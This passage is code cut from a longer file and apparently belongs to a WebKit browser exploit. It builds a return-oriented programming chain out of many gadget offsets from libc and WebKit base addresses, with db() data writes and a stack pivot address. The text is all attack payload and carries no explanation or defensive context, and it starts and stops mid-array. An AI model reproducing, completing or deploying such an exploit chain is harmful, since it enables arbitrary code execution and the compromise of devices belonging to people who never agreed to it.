libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+361848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+361936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+361952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+362104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+362088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+362256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+362240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+362360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+362416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+362536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362552, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+362728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+362696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+362784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+362888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362920, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+362904, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+363032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+363240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+363384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+363592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+363824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+364032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+364048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+364160, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+364144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+364256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+364336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+364392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+364488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+364576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+364592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+364744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+364728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+364760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+364896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+364880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+365000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+365056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+365128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+365184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+365288, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+365376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+365392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+365544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+365576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+365528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+365560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+365672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+365656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+365760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+365832, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+365896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+360288, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965088, 4294967295]); 
set_gadgets([
libc_base+792472, 
 pivot_addr,
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+366064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+366200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+366352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+366408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+366560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+366544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+366672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+366640, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398744, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+366744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+366880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([12, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+367032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+367208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+367240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398792, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965088, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+367472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367600, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+367808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+367840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367792, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+367824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+368000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+367968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+368104, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+368088, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+368200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+368336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+368488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+368544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+368720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+368704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+562536, 
libc_base+793877, 
ropchain+368776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965088, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+368960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+368976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+369088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+369104, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877568, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+369320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+369400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+369456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([10, 0]); 
set_gadget(libc_base+792472,); 
db([10, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+369608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+369736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+369880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([142, 0]); 
set_gadget(libc_base+788575,); 
db([142, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+370072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+370040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+370024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+370128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+370232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+370264, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+370248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+370360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+370344, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+370456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+370536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+370592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([9, 0]); 
set_gadget(libc_base+792472,); 
db([9, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+370744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+370800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+370872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+370928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+371032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+371168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([4, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+371320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+371376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+371528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+371512, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+371640, 
webkit_base+7438103, 
